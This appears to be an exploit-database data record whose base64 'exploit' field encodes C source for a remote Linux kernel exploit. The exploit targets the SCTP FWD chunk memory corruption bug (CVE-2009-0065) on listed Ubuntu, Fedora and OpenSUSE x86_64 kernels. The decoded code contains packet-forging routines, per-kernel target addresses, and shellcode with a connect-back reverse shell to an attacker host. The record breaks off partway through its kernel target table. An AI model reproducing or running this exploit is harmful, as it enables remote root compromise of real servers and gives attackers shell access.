{
    "source": "exploit-database", 
    "exploit": "LyogQ1ZFLTIwMDktMDA2NSBTQ1RQIEZXRCBDaHVuayBNZW1vcnkgQ29ycnVwdGlvbiANCiAqIExpbnV4IEtlcm5lbCAyLjYueCBTQ1RQIEZXRCBNZW1vcnkgQ09ycnVwdGlvbiBSZW1vdGUgRXhwbG9pdCANCiAqDQogKiBjb2RlZCBieTogc2dyYWtreXUgPGF0PiBhbnRpZm9yay5vcmcNCiAqIGh0dHA6Ly9rZXJuZWxib2YuYmxvZ3Nwb3QuY29tDQogKg0KICoNCiAqIE5PVEU6IHlvdSBuZWVkIGF0IGxlYXN0IG9uZSBzY3RwIGFwcGxpY2F0aW9uIGJvdW5kIG9uIHRoZSB0YXJnZXQgYm94IA0KICoNCiAqIFN1cHBvcnRlZCB0YXJnZXQ6DQogKiBVYnVudHUgNy4wNCB4ODZfNjQgKDIuNi4yMF8xNS0xNy1nZW5lcmljIC8gMi42LjIwXzE3LXNlcnZlcikNCiAqIFVidW50dSA4LjA0IHg4Nl82NCAoMi42LjI0XzE2LTIzIGdlbmVyaWMvc2VydmVyKQ0KICogVWJ1bnR1IDguMTAgeDg2XzY0ICgyLjYuMjdfNy0xMCBnZWVucmljL3NlcnZlcikNCiAqIEZlZG9yYSBDb3JlIDEwIHg4Nl82NCAoZGVmYXVsdCBpbnN0YWxsZWQga2VybmVsKQ0KICogT3BlblN1c2UgMTEuMSB4ODZfNjQgIChkZWZhdWx0IGluc3RhbGxlZCBrZXJuZWwpIA0KICovDQoNCg0KDQoNCiNkZWZpbmUgX0dOVV9TT1VSQ0UNCg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPHNjaGVkLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pcC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvc2N0cC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN5cy93YWl0Lmg+DQojaW5jbHVkZSA8c3lzL3RpbWUuaD4NCiNpbmNsdWRlIDxzeXMvc2VsZWN0Lmg+DQojaW5jbHVkZSA8c3RkaW50Lmg+DQoNCiNkZWZpbmUgX19PRkZTRVRfUE9SVF82NCA2MiAvLyA5Mg0KI2RlZmluZSBfX09GRlNFVF9IT1NUXzY0IDY0IC8vIDk0DQoNCi8vI2RlZmluZSBfX1RBUkdFVF9TUE9SVCAyMDAwMA0KDQoNCiNpZm5kZWYgX191OA0KI2RlZmluZSBfX3U4IHVpbnQ4X3QNCiNlbmRpZg0KDQojaWZuZGVmIF9fdTE2DQojZGVmaW5lIF9fdTE2IHVpbnQxNl90DQojZW5kaWYNCg0KI2lmbmRlZiBfX3UzMg0KI2RlZmluZSBfX3UzMiB1aW50MzJfdA0KI2VuZGlmDQoNCg0KDQovKiBzdGFydCBjcmMgcm91dGluZXM6IHJpcHBlZCBmcm9tIHdpcmVzaGFyayBzb3VyY2VzICovDQojZGVmaW5lIFNQX0xFTiAyDQojZGVmaW5lIERQX0xFTiAyDQojZGVmaW5lIFZUQUdfTEVOIDQNCiNkZWZpbmUgQ0hLX0xFTiA0DQojZGVmaW5lIEhFQURFUl9MRU4gICAgKFNQX0xFTiArIERQX0xFTiArIFZUQUdfTEVOICsgQ0hLX0xFTikgDQoNCg0KI2RlZmluZSBDUkMzMkMoYyxkKSAoYz0oYz4+OCleY3JjX2NbKGNeKGQpKSYweEZGXSkNCnN0YXRpYyBpbnQzMl90IGNyY19jWzI1Nl0gPQ0Kew0KMHgwMDAwMDAwMEwsIDB4RjI2QjgzMDNMLCAweEUxM0I3MEY3TCwgMHgxMzUwRjNGNEwsDQoweEM3OUE5NzFGTCwgMHgzNUYxMTQxQ0wsIDB4MjZBMUU3RThMLCAweEQ0Q0E2NEVCTCwNCjB4OEFEOTU4Q0ZMLCAweDc4QjJEQkNDTCwgMHg2QkUyMjgzOEwsIDB4OTk4OUFCM0JMLA0KMHg0RDQzQ0ZEMEwsIDB4QkYyODRDRDNMLCAweEFDNzhCRjI3TCwgMHg1RTEzM0MyNEwsDQoweDEwNUVDNzZGTCwgMHhFMjM1NDQ2Q0wsIDB4RjE2NUI3OThMLCAweDAzMEUzNDlCTCwNCjB4RDdDNDUwNzBMLCAweDI1QUZEMzczTCwgMHgzNkZGMjA4N0wsIDB4QzQ5NEEzODRMLA0KMHg5QTg3OUZBMEwsIDB4NjhFQzFDQTNMLCAweDdCQkNFRjU3TCwgMHg4OUQ3NkM1NEwsDQoweDVEMUQwOEJGTCwgMHhBRjc2OEJCQ0wsIDB4QkMyNjc4NDhMLCAweDRFNERGQjRCTCwNCjB4MjBCRDhFREVMLCAweEQyRDYwRERETCwgMHhDMTg2RkUyOUwsIDB4MzNFRDdEMkFMLA0KMHhFNzI3MTlDMUwsIDB4MTU0QzlBQzJMLCAweDA2MUM2OTM2TCwgMHhGNDc3RUEzNUwsDQoweEFBNjRENjExTCwgMHg1ODBGNTUxMkwsIDB4NEI1RkE2RTZMLCAweEI5MzQyNUU1TCwNCjB4NkRGRTQxMEVMLCAweDlGOTVDMjBETCwgMHg4Q0M1MzFGOUwsIDB4N0VBRUIyRkFMLA0KMHgzMEUzNDlCMUwsIDB4QzI4OENBQjJMLCAweEQxRDgzOTQ2TCwgMHgyM0IzQkE0NUwsDQoweEY3NzlERUFFTCwgMHgwNTEyNURBREwsIDB4MTY0MkFFNTlMLCAweEU0MjkyRDVBTCwNCjB4QkEzQTExN0VMLCAweDQ4NTE5MjdETCwgMHg1QjAxNjE4OUwsIDB4QTk2QUUyOEFMLA0KMHg3REEwODY2MUwsIDB4OEZDQjA1NjJMLCAweDlDOUJGNjk2TCwgMHg2RUYwNzU5NUwsDQoweDQxN0IxREJDTCwgMHhCMzEwOUVCRkwsIDB4QTA0MDZENEJMLCAweDUyMkJFRTQ4TCwNCjB4ODZFMThBQTNMLCAweDc0OEEwOUEwTCwgMHg2N0RBRkE1NEwsIDB4OTVCMTc5NTdMLA0KMHhDQkEyNDU3M0wsIDB4MzlDOUM2NzBMLCAweDJBOTkzNTg0TCwgMHhEOEYyQjY4N0wsDQoweDBDMzhEMjZDTCwgMHhGRTUzNTE2RkwsIDB4RUQwM0EyOUJMLCAweDFGNjgyMTk4TCwNCjB4NTEyNURBRDNMLCAweEEzNEU1OUQwTCwgMHhCMDFFQUEyNEwsIDB4NDI3NTI5MjdMLA0KMHg5NkJGNERDQ0wsIDB4NjRENENFQ0ZMLCAweDc3ODQzRDNCTCwgMHg4NUVGQkUzOEwsDQoweERCRkM4MjFDTCwgMHgyOTk3MDExRkwsIDB4M0FDN0YyRUJMLCAweEM4QUM3MUU4TCwNCjB4MUM2NjE1MDNMLCAweEVFMEQ5NjAwTCwgMHhGRDVENjVGNEwsIDB4MEYzNkU2RjdMLA0KMHg2MUM2OTM2MkwsIDB4OTNBRDEwNjFMLCAweDgwRkRFMzk1TCwgMHg3Mjk2NjA5NkwsDQoweEE2NUMwNDdETCwgMHg1NDM3ODc3RUwsIDB4NDc2Nzc0OEFMLCAweEI1MENGNzg5TCwNCjB4RUIxRkNCQURMLCAweDE5NzQ0OEFFTCwgMHgwQTI0QkI1QUwsIDB4Rjg0RjM4NTlMLA0KMHgyQzg1NUNCMkwsIDB4REVFRURGQjFMLCAweENEQkUyQzQ1TCwgMHgzRkQ1QUY0NkwsDQoweDcxOTg1NDBETCwgMHg4M0YzRDcwRUwsIDB4OTBBMzI0RkFMLCAweDYyQzhBN0Y5TCwNCjB4QjYwMkMzMTJMLCAweDQ0Njk0MDExTCwgMHg1NzM5QjNFNUwsIDB4QTU1MjMwRTZMLA0KMHhGQjQxMENDMkwsIDB4MDkyQThGQzFMLCAweDFBN0E3QzM1TCwgMHhFODExRkYzNkwsDQoweDNDREI5QkRETCwgMHhDRUIwMThERUwsIDB4RERFMEVCMkFMLCAweDJGOEI2ODI5TCwNCjB4ODJGNjNCNzhMLCAweDcwOURCODdCTCwgMHg2M0NENEI4RkwsIDB4OTFBNkM4OENMLA0KMHg0NTZDQUM2N0wsIDB4QjcwNzJGNjRMLCAweEE0NTdEQzkwTCwgMHg1NjNDNUY5M0wsDQoweDA4MkY2M0I3TCwgMHhGQTQ0RTBCNEwsIDB4RTkxNDEzNDBMLCAweDFCN0Y5MDQzTCwNCjB4Q0ZCNUY0QThMLCAweDNEREU3N0FCTCwgMHgyRThFODQ1RkwsIDB4RENFNTA3NUNMLA0KMHg5MkE4RkMxN0wsIDB4NjBDMzdGMTRMLCAweDczOTM4Q0UwTCwgMHg4MUY4MEZFM0wsDQoweDU1MzI2QjA4TCwgMHhBNzU5RTgwQkwsIDB4QjQwOTFCRkZMLCAweDQ2NjI5OEZDTCwNCjB4MTg3MUE0RDhMLCAweEVBMUEyN0RCTCwgMHhGOTRBRDQyRkwsIDB4MEIyMTU3MkNMLA0KMHhERkVCMzNDN0wsIDB4MkQ4MEIwQzRMLCAweDNFRDA0MzMwTCwgMHhDQ0JCQzAzM0wsDQoweEEyNEJCNUE2TCwgMHg1MDIwMzZBNUwsIDB4NDM3MEM1NTFMLCAweEIxMUI0NjUyTCwNCjB4NjVEMTIyQjlMLCAweDk3QkFBMUJBTCwgMHg4NEVBNTI0RUwsIDB4NzY4MUQxNERMLA0KMHgyODkyRUQ2OUwsIDB4REFGOTZFNkFMLCAweEM5QTk5RDlFTCwgMHgzQkMyMUU5REwsDQoweEVGMDg3QTc2TCwgMHgxRDYzRjk3NUwsIDB4MEUzMzBBODFMLCAweEZDNTg4OTgyTCwNCjB4QjIxNTcyQzlMLCAweDQwN0VGMUNBTCwgMHg1MzJFMDIzRUwsIDB4QTE0NTgxM0RMLA0KMHg3NThGRTVENkwsIDB4ODdFNDY2RDVMLCAweDk0QjQ5NTIxTCwgMHg2NkRGMTYyMkwsDQoweDM4Q0MyQTA2TCwgMHhDQUE3QTkwNUwsIDB4RDlGNzVBRjFMLCAweDJCOUNEOUYyTCwNCjB4RkY1NkJEMTlMLCAweDBEM0QzRTFBTCwgMHgxRTZEQ0RFRUwsIDB4RUMwNjRFRURMLA0KMHhDMzhEMjZDNEwsIDB4MzFFNkE1QzdMLCAweDIyQjY1NjMzTCwgMHhEMERERDUzMEwsDQoweDA0MTdCMURCTCwgMHhGNjdDMzJEOEwsIDB4RTUyQ0MxMkNMLCAweDE3NDc0MjJGTCwNCjB4NDk1NDdFMEJMLCAweEJCM0ZGRDA4TCwgMHhBODZGMEVGQ0wsIDB4NUEwNDhERkZMLA0KMHg4RUNFRTkxNEwsIDB4N0NBNTZBMTdMLCAweDZGRjU5OUUzTCwgMHg5RDlFMUFFMEwsDQoweEQzRDNFMUFCTCwgMHgyMUI4NjJBOEwsIDB4MzJFODkxNUNMLCAweEMwODMxMjVGTCwNCjB4MTQ0OTc2QjRMLCAweEU2MjJGNUI3TCwgMHhGNTcyMDY0M0wsIDB4MDcxOTg1NDBMLA0KMHg1OTBBQjk2NEwsIDB4QUI2MTNBNjdMLCAweEI4MzFDOTkzTCwgMHg0QTVBNEE5MEwsDQoweDlFOTAyRTdCTCwgMHg2Q0ZCQUQ3OEwsIDB4N0ZBQjVFOENMLCAweDhEQzBERDhGTCwNCjB4RTMzMEE4MUFMLCAweDExNUIyQjE5TCwgMHgwMjBCRDhFREwsIDB4RjA2MDVCRUVMLA0KMHgyNEFBM0YwNUwsIDB4RDZDMUJDMDZMLCAweEM1OTE0RkYyTCwgMHgzN0ZBQ0NGMUwsDQoweDY5RTlGMEQ1TCwgMHg5QjgyNzNENkwsIDB4ODhEMjgwMjJMLCAweDdBQjkwMzIxTCwNCjB4QUU3MzY3Q0FMLCAweDVDMThFNEM5TCwgMHg0RjQ4MTczREwsIDB4QkQyMzk0M0VMLA0KMHhGMzZFNkY3NUwsIDB4MDEwNUVDNzZMLCAweDEyNTUxRjgyTCwgMHhFMDNFOUM4MUwsDQoweDM0RjRGODZBTCwgMHhDNjlGN0I2OUwsIDB4RDVDRjg4OURMLCAweDI3QTQwQjlFTCwNCjB4NzlCNzM3QkFMLCAweDhCRENCNEI5TCwgMHg5ODhDNDc0REwsIDB4NkFFN0M0NEVMLA0KMHhCRTJEQTBBNUwsIDB4NEM0NjIzQTZMLCAweDVGMTZEMDUyTCwgMHhBRDdENTM1MUwsDQp9Ow0KDQpzdGF0aWMgX191MzIgc2N0cF9jcmMzMmMoY29uc3QgdW5zaWduZWQgY2hhciogYnVmLCBfX3UzMiBsZW4pDQp7DQogIF9fdTMyIGk7DQogIF9fdTMyIGNyYzMyID0gfjBVOw0KICBfX3UzMiByOw0KICB1bnNpZ25lZCBjaGFyIGIwLGIxLGIyLGIzOw0KDQogIGZvciAoaSA9IDA7IGkgPCBTUF9MRU4gKyBEUF9MRU4gKyBWVEFHX0xFTjsgaSsrKQ0KICB7DQogICAgQ1JDMzJDKGNyYzMyLCBidWZbaV0pOw0KICB9DQogIENSQzMyQyhjcmMzMiwgMCk7DQogIENSQzMyQyhjcmMzMiwgMCk7DQogIENSQzMyQyhjcmMzMiwgMCk7DQogIENSQzMyQyhjcmMzMiwgMCk7DQogIGZvciAoaSA9IEhFQURFUl9MRU47IGkgPCBsZW47IGkrKykNCiAgew0KICAgIENSQzMyQyhjcmMzMiwgYnVmW2ldKTsNCiAgfQ0KICByID0gfmNyYzMyOw0KDQogIGIwID0gciAmIDB4ZmY7DQogIGIxID0gKHI+PjgpICYgMHhmZjsNCiAgYjIgPSAocj4+MTYpICYgMHhmZjsNCiAgYjMgPSAocj4+MjQpICYgMHhmZjsNCiAgY3JjMzIgPSAoKGIwIDw8IDI0KSB8IChiMSA8PCAxNikgfCAoYjIgPDwgOCkgfCBiMyk7DQogIHJldHVybiAoIGNyYzMyICk7DQp9DQovKiBlbmQgY3JjIHJvdXRpbmVzICovDQoNCnN0YXRpYyBjaGFyIGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZVtdID0gDQovLyBwcm9sb2cgDQoiXHg5MFx4NTNceDQ4XHgzMVx4YzBceGIwXHg2Nlx4MGZceDA1XHg0OFx4MzFceGRiIg0KIlx4NDhceDM5XHhkOFx4NzVceDBmXHg0OFx4MzFceGMwXHhiMFx4MDJceGNkXHg4MCINCiJceDQ4XHgzMVx4ZGJceDQ4XHgzOVx4YzNceDc0XHgwOVx4NWJceDQ4XHgzMVx4YzAiDQoiXHhiMFx4NjBceDBmXHgwNVx4YzMiICAgICAgICAgIA0KLy8gY29ubmVjdCBiYWNrIA0KIlx4NDhceDMxXHhkMlx4NmFceDAxXHg1ZVx4NmFceDAyXHg1Zlx4NmFceDI5XHg1OCIgICAgICAgICAgICAgICAgICAgICAgICAgICANCiJceDBmXHgwNVx4NDhceDk3XHg1MFx4NDhceGI5XHgwMlx4MDBceDBkXHgwNVx4N2YiDQoiXHgwMFx4MDBceDAxXHg1MVx4NDhceDg5XHhlNlx4NmFceDEwXHg1YVx4NmFceDJhIiAgICAgICAgICAgICAgICAgDQoiXHg1OFx4MGZceDA1XHg0OFx4MzFceGRiXHg0OFx4MzlceGMzXHg3NFx4MDdceDQ4Ig0KIlx4MzFceGMwXHhiMFx4ZTdceDBmXHgwNVx4OTAiICAgICAgICAgIA0KIlx4NmFceDAzXHg1ZVx4NmFceDIxXHg1OFx4NDhceGZmXHhjZVx4MGZceDA1XHg3NSINCiJceGY2XHg0OFx4YmJceGQwXHg5ZFx4OTZceDkxXHhkMFx4OGNceDk3XHhmZlx4NDgiDQoiXHhmN1x4ZDNceDUzXHg0OFx4ODlceGU3XHg0OFx4MzFceGMwXHg1MFx4NTdceDQ4Ig0KIlx4ODlceGU2XHg0OFx4MzFceGQyXHhiMFx4M2JceDBmXHgwNVx4NDhceDMxXHhjMCINCiJceGIwXHhlN1x4MGZceDA1Ig0KOw0KDQpzdGF0aWMgY29uc3QgY2hhciBfX3plcm9bNF0gPSB7MHgwMCwgMHgwMCwgMHgwMCwgMHgwMH07DQovL3N0YXRpYyBjaGFyIF9fZm9yY2VfY3Jhc2hbXSA9ICJceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MSI7DQoNCnN0YXRpYyBjaGFyIGdlbmVyaWNfeDg2XzY0X3BhdGNoanVtcFtdID0gIlx4NDhceDMxXHhjMFx4YjBceDYwXHgwZlx4MDVceGMzIjsNCnN0YXRpYyBjaGFyIGdlbmVyaWNfeDg2XzY0X2p1bXBbXSA9ICJceGU5XHgyYlx4MDlceDAwXHgwMFx4OTAiOw0KDQovKiB1YnVudHUgNy4wNCAqLw0Kc3RhdGljIGNoYXIgdWJ1bnR1NjRfMl82XzIwXzE1dG8xN19nZW5lcmljX3g4Nl82NF92c3lzX3NoYWRvd1tdID0gIlx4MDBceDQwXHg1Nlx4ODBceEZGXHhGRlx4RkZceEZGIjsNCnN0YXRpYyBjaGFyIHVidW50dTY0XzJfNl8yMF8xN19zZXJ2ZXJfeDg2XzY0X3ZzeXNfc2hhZG93W10gPSAiXHgwMFx4OTBceDVCXHg4MFx4RkZceEZGXHhGRlx4RkYiOw0KDQovKiB1YnVudHUgOC4wNCAqLw0Kc3RhdGljIGNoYXIgdWJ1bnR1NjRfMl82XzI0XzIzX2xhc3Rfc2VydmVyX3g4Nl82NF92c3lzX3NoYWRvd1tdID0gICAgIlx4MDBceDUwXHg2Mlx4ODBceEZGXHhGRlx4RkZceEZGIjsgIA0Kc3RhdGljIGNoYXIgdWJ1bnR1NjRfMl82XzI0XzE5dG8yMl9zZXJ2ZXJfeDg2XzY0X3ZzeXNfc2hhZG93W10gPSAgICJceDAwXHg0MFx4NjJceDgwXHhGRlx4RkZceEZGXHhGRiI7ICANCnN0YXRpYyBjaGFyIHVidW50dTY0XzJfNl8yNF8xNnRvMThfc2VydmVyX3g4Nl82NF92c3lzX3NoYWRvd1tdID0gICAiXHgwMFx4MzBceDYyXHg4MFx4RkZceEZGXHhGRlx4RkYiOw0KDQpzdGF0aWMgY2hhciB1YnVudHU2NF8yXzZfMjRfMTh0bzIxX2dlbmVyaWNfeDg2XzY0X3ZzeXNfc2hhZG93W10gPSAgIlx4MDBceDQwXHg1ZFx4ODBceEZGXHhGRlx4RkZceEZGIjsgDQoNCi8qIHVidW50dSA4LjEwICAqLw0Kc3RhdGljIGNoYXIgdWJ1bnR1NjRfMl82XzI3Xzdfc2VydmVyX3g4Nl82NF92c3lzX3NoYWRvd1tdID0gICJceDAwXHgzMFx4NmZceDgwXHhGRlx4RkZceEZGXHhGRiI7ICANCnN0YXRpYyBjaGFyIHVidW50dTY0XzJfNl8yN185dG9sYXN0X3NlcnZlcl94ODZfNjRfdnN5c19zaGFkb3dbXSA9ICAiXHgwMFx4NDBceDZmXHg4MFx4RkZceEZGXHhGRlx4RkYiOyAgIA0KDQpzdGF0aWMgY2hhciB1YnVudHU2NF8yXzZfMjdfN3RvbGFzdF9nZW5lcmljX3g4Nl82NF92c3lzX3NoYWRvd1tdID0gICJceDAwXHg0MFx4NmZceDgwXHhGRlx4RkZceEZGXHhGRiI7ICAgDQoNCi8qIGZlZG9yYSBjb2RlIDEwICAqLw0Kc3RhdGljIGNoYXIgZmVkb3JhNjRfMTBfZGVmYXVsdF9rZXJuZWxfeDg2XzY0X3ZzeXNfc2hhZG93W10gPSAiXHgwMFx4MTBceDU3XHg4MVx4RkZceEZGXHhGRlx4RkYiOw0Kc3RhdGljIGNoYXIgZmVkb3JhNjRfMTBfZGVmYXVsdF9rZXJuZWxfeDg2XzY0X3NlbGludXhbXSAgICAgPSAiXHg4NFx4RTZceDdDXHg4MVx4RkZceEZGXHhGRlx4RkYiOw0KDQovKiBvcGVuc3VzZSAxMS4xICovDQpzdGF0aWMgY2hhciBvcGVuc3VzZTY0XzExXzFfZGVmYXVsdF9rZXJuZWxfeDg2XzY0X3ZzeXNfc2hhZG93W109Ilx4MDBceDEwXHg4RVx4ODBceEZGXHhGRlx4RkZceEZGIjsNCg0KDQojZGVmaW5lIF9fbXNnX2YoZm9ybWF0LCBhcmdzLi4uKSBcDQogIGRvIHsgZnByaW50ZihzdGRvdXQsIGZvcm1hdCwgIyMgYXJncyk7IH0gd2hpbGUoMCkNCg0KI2RlZmluZSBfX21zZyhtc2cpIFwNCiAgZG8geyBmcHJpbnRmKHN0ZG91dCwgIiVzIiwgbXNnKTsgfSB3aGlsZSgwKQ0KDQojZGVmaW5lIF9fZmF0YWwobXNnKSBcDQogIGRvIHtmcHJpbnRmKHN0ZGVyciwgIiVzIiwgbXNnKTsgZXhpdCgxKTt9IHdoaWxlICgwKQ0KDQojZGVmaW5lIF9fZmF0YWxfcGVycm9yKG1zZykgXA0KICBkbyB7IHBlcnJvcihtc2cpOyBleGl0KDEpOyB9IHdoaWxlICgwKQ0KDQplbnVtIHsNCiAgU0xBQl9BTExPQ0FUT1I9MCwNCiAgU0xVQl9BTExPQ0FUT1I9MQ0KfTsNCg0KdHlwZWRlZiBzdHJ1Y3QgDQp7DQogIGNvbnN0IGNoYXIgKm5hbWU7DQogIGNvbnN0IGNoYXIgKmluZm87DQogIGNoYXIgKnNjb2RlOw0KICBfX3UzMiBzY29kZXNpemU7DQogIF9fdTMyIHBvcnRvZmY7DQogIF9fdTMyIGhvc3RvZmY7ICANCiAgY29uc3QgY2hhciAqdnN5c2FkZHI7DQogIGNvbnN0IGNoYXIgKnZzeXNqdW1wOw0KICBfX3UzMiB2c3lzanVtcHNpemU7DQoNCiAgY29uc3QgY2hhciAqdnN5c3BhdGNoanVtcDsNCiAgX191MzIgdnN5c3BhdGNoanVtcHNpemU7DQogDQogIF9fdTMyIGNodW5rc2l6ZTsNCiAgX191MzIgc2x1YnNpemU7IA0KICBfX3UzMiBwdHJzaXplOw0KDQogIGNvbnN0IGNoYXIgKnNlbGludXg7DQoNCiAgaW50IGFsbG9jYXRvcl90eXBlOw0KDQp9IGtpbmZvOw0KDQpzdGF0aWMga2luZm8gKms7DQoNCnR5cGVkZWYgc3RydWN0IA0Kew0KICBjb25zdCBjaGFyKiB0YXJnZXQ7DQogIGNvbnN0IGNoYXIqIHJob3N0Ow0KICBjb25zdCBjaGFyKiBsaG9zdDsNCiAgX191MTYgcnBvcnQ7DQogIF9fdTE2IGxwb3J0Ow0KICANCiAgX191MTYgc3BvcnQ7IC8vIGRlZmluZXMgYXNzb2NpYXRpb25zDQogIF9fdTE2IG5jb25uOw0KICANCn0gaGluZm87DQoNCnN0YXRpYyBoaW5mbyBoID0geyBOVUxMLCBOVUxMLCBOVUxMLCAwLCAwLCAwLCA2MDAgfTsNCg0Kc3RhdGljIGtpbmZvIGtlcm5lbHNbXSA9IHsgDQogICAgeyANCiAgICAgICJ1YnVudHU2NF9mYWlzdHktMi42LjIwLVsxNS0xN10tZ2VuZXJpYyIsIA0KICAgICAgIihmYWlzdHk6IGdlbmVyaWMga2VybmVsKSIsIA0KICAgICAgZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlLCANCiAgICAgIHNpemVvZihnZW5lcmljX3g4Nl82NF9zaGVsbGNvZGUpIC0xLCANCiAgICAgIF9fT0ZGU0VUX1BPUlRfNjQsDQogICAgICBfX09GRlNFVF9IT1NUXzY0LA0KICAgICAgdWJ1bnR1NjRfMl82XzIwXzE1dG8xN19nZW5lcmljX3g4Nl82NF92c3lzX3NoYWRvdywNCiAgICAgIGdlbmVyaWNfeDg2XzY0X2p1bXAsDQogICAgICA2LA0KICAgICAgZ2VuZXJpY194ODZfNjRfcGF0Y2hqdW1wLA0KICAgICAgOCwNCiAgICAgIDQwLA0KICAgICAgMjU2LA0KICAgICAgOCwNCiAgICAgIE5VTEwsDQogICAgICBTTEFCX0FMTE9DQVRPUg0KICAgIH0sDQogICAgeyANCiAgICAgICJ1YnVudHU2NF9mYWlzdHktMi42LjIwLTE3LXNlcnZlciIsIA0KICAgICAgIihmYWlzdHk6IHNlcnZlciBrZXJuZWwgLSBsYXN0IDIuNi4yMC0xNyBidWlsZCkiLCANCiAgICAgIGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZSwgDQogICAgICBzaXplb2YoZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlKSAtMSwgDQogICAgICBfX09GRlNFVF9QT1JUXzY0LA0KICAgICAgX19PRkZTRVRfSE9TVF82NCwNCiAgICAgIHVidW50dTY0XzJfNl8yMF8xN19zZXJ2ZXJfeDg2XzY0X3ZzeXNfc2hhZG93LA0KICAgICAgZ2VuZXJpY194ODZfNjRfanVtcCwNCiAgICAgIDYsDQogICAgICBnZW5lcmljX3g4Nl82NF9wYXRjaGp1bXAsDQogICAgICA4LA0KICAgICAgNDAsDQogICAgICAyNTYsDQogICAgICA4LA0KICAgICAgTlVMTCwNCiAgICAgIFNMQUJfQUxMT0NBVE9SDQogICAgfSwNCiAgICB7DQogICAgICAidWJ1bnR1NjRfaGFyZHktMi42LjI0LVsxOC0yMV0tZ2VuZXJpYyIsDQogICAgICAiKGtlcm5lbCBmcm9tIDIuNi4yNC0xOCB0byBrZXJuZWwgMi42LjI0LTIxIC0tIGdlbmVyaWMpIiwNCiAgICAgIGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZSwNCiAgICAgIHNpemVvZihnZW5lcmljX3g4Nl82NF9zaGVsbGNvZGUpIC0xLA0KICAgICAgX19PRkZTRVRfUE9SVF82NCwNCiAgICAgIF9fT0ZGU0VUX0hPU1RfNjQsDQogICAgICB1YnVudHU2NF8yXzZfMjRfMTh0bzIxX2dlbmVyaWNfeDg2XzY0X3ZzeXNfc2hhZG93LA0KICAgICAgZ2VuZXJpY194ODZfNjRfanVtcCwNCiAgICAgIDYsDQogICAgICBnZW5lcmljX3g4Nl82NF9wYXRjaGp1bXAsDQogICAgICA4LA0KICAgICAgNDAsDQogICAgICA5NiwNCiAgICAgIDgsDQogICAgICBOVUxMLA0KICAgICAgU0xVQl9BTExPQ0FUT1INCiAgICB9LA0KICAgIHsNCiAgICAgICJ1YnVudHU2NF9oYXJkeV8yLjYuMjQtWzE2LTE4XS1zZXJ2ZXIiLA0KICAgICAgIihrZXJuZWwgZnJvbSAyLjYuMjQtMTYgdG8gMi42LjI0LTE4IC0tIHNlcnZlcikiLCANCiAgICAgIGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZSwNCiAgICAgIHNpemVvZihnZW5lcmljX3g4Nl82NF9zaGVsbGNvZGUpIC0xLA0KICAgICAgX19PRkZTRVRfUE9SVF82NCwNCiAgICAgIF9fT0ZGU0VUX0hPU1RfNjQsDQogICAgICB1YnVudHU2NF8yXzZfMjRfMTZ0bzE4X3NlcnZlcl94ODZfNjRfdnN5c19zaGFkb3csDQogICAgICBnZW5lcmljX3g4Nl82NF9qdW1wLA0KICAgICAgNiwNCiAgICAgIGdlbmVyaWNfeDg2XzY0X3BhdGNoanVtcCwNCiAgICAgIDgsDQogICAgICA0MCwNCiAgICAgIDk2LA0KICAgICAgOCwNCiAgICAgIE5VTEwsDQogICAgICBTTFVCX0FMTE9DQVRPUg0KICAgIH0sDQogICAgew0KICAgICAgInVidW50dTY0X2hhcmR5LTIuNi4yNC1bMTktMjJdLXNlcnZlciIsDQogICAgICAiKGtlcm5lbCBmcm9tIDIuNi4yNC0xOSB0byAyLjYuMjQtMjIgLS0gc2VydmVyKSIsIA0KICAgICAgZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlLA0KICAgICAgc2l6ZW9mKGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZSkgLTEsDQogICAgICBfX09GRlNFVF9QT1JUXzY0LA0KICAgICAgX19PRkZTRVRfSE9TVF82NCwNCiAgICAgIHVidW50dTY0XzJfNl8yNF8xOXRvMjJfc2VydmVyX3g4Nl82NF92c3lzX3NoYWRvdywNCiAgICAgIGdlbmVyaWNfeDg2XzY0X2p1bXAsDQogICAgICA2LA0KICAgICAgZ2VuZXJpY194ODZfNjRfcGF0Y2hqdW1wLA0KICAgICAgOCwNCiAgICAgIDQwLA0KICAgICAgOTYsDQogICAgICA4LA0KICAgICAgTlVMTCwNCiAgICAgIFNMVUJfQUxMT0NBVE9SDQogICAgfSwNCiAgICB7DQogICAgICAidWJ1bnR1NjRfaGFyZHktMi42LjI0LTIzLWxhc3Qtc2VydmVyIiwNCiAgICAgICIobGFzdCAyLjYuMjQtMjMga2VybmVsIGJlZm9yZSBwYXRjaCAtLSBzZXJ2ZXIpIiwgDQogICAgICBnZW5lcmljX3g4Nl82NF9zaGVsbGNvZGUsDQogICAgICBzaXplb2YoZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlKSAtMSwNCiAgICAgIF9fT0ZGU0VUX1BPUlRfNjQsDQogICAgICBfX09GRlNFVF9IT1NUXzY0LA0KICAgICAgdWJ1bnR1NjRfMl82XzI0XzIzX2xhc3Rfc2VydmVyX3g4Nl82NF92c3lzX3NoYWRvdywNCiAgICAgIGdlbmVyaWNfeDg2XzY0X2p1bXAsDQogICAgICA2LA0KICAgICAgZ2VuZXJpY194ODZfNjRfcGF0Y2hqdW1wLA0KICAgICAgOCwNCiAgICAgIDQwLA0KICAgICAgOTYsDQogICAgICA4LA0KICAgICAgTlVMTCwNCiAgICAgIFNMVUJfQUxMT0NBVE9SDQogICAgfSwNCiAgICB7IA0KICAgICAgInVidW50dTY0X2ludHJlcGlkLTIuNi4yNy03LXNlcnZlciIsIA0KICAgICAgIihrZXJuZWwgMi42LjI3LTcgLS0gc2VydmVyKSIsDQogICAgICBnZW5lcmljX3g4Nl82NF9zaGVsbGNvZGUs